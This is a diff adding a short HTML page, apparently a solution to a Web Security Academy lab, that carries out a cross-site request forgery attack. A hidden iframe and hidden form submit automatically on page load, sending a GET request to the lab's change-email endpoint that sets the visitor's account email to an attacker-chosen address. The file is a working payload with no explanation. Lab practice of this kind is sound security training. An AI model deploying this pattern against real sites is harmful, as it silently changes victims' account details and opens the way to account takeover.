@@ -1,0 +1,17 @@
+<html>
+    <body>
+        <h1>
+            Hello
+        </h1>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://0a140035030bd26883ff872500fd0057.web-security-academy.net/my-account/change-email" 
+        method="GET" 
+        target="csrf-iframe" 
+        id="csrf-form">
+            <input type="hidden" name="email" value="random@bing.bong">
+        </form>
+    </body>
+    <script>
+        document.getElementById("csrf-form").submit()
+    </script>
+</html>
